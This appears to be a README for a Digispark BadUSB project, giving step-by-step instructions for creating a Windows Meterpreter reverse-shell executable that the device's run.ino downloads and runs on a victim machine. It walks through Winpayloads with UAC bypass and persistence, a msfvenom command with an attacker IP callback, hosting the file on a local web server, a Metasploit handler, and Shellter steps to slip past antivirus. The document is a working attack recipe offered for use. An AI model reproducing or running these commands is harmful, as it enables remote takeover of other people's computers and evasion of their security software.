## Instructions To Creating the Payload to be executed by run.ino:

 ### METHOD 1 On the host machine(Linux): Using Winpayloads 
   ~ https://github.com/nccgroup/Winpayloads/blob/master/README.md ~
   #### Installation: 
        1. `git clone https://github.com/nccgroup/Winpayloads.git`  
        2. `cd Winpayloads`  
        3. `./setup.sh`
        
   #### RUN: 
        1. `./WinPayLoads.py`
        2. `2` (to run Windows Meterpreter Reverse Shell [uacbypass, persistence, allchecks]  )
        3. Enter port and ip or simply press Enter for defaults
        4. `y` (for UAC Bypass)
        5. enter victim windows version
        6. `y` to upload to local webserver
        7. That's it!! update run.ino with the url to the executable eg: http://192.168.0.24:8000/fgxjdqzp.exe, then compile and load to your digispark

  ### On the host machine (linux): // if above method doesn't work. (note: change 192.168.0.24 to your ip, and 8080 to the port you desire)
   1.  msfvenom -p windows/meterpreter/reverse_tcp -a x86 –platform windows LHOST=192.168.0.24 LPORT=8080 -f exe > shell.exe   
   2.  cp shell.exe /var/www/html
   3.  *OPTIONAL* go to Avoiding AntiVirus
   4.  service apache2 start
   5.  msfconsole
   6.  use exploit/multi/handler
   7.  set PAYLOAD windows/meterpreter/reverse_tcp
   8.  set LHOST 192.168.0.24
   9.  set LPORT 8080
   10.  exploit
   
   ### Avoiding Anti Virus
    1. sudo apt-get install shellter [ You might be required to install wine32 first (dpkg --add-architecture i386 && apt-get update && apt-get install wine32) ]
    2. shellter
    3. A (to select AUTO)
    4. /var/www/htmlEnter path to your executable
    5. Y (to enter stealth mode)
    6. Enter LHOST and LPORT
    

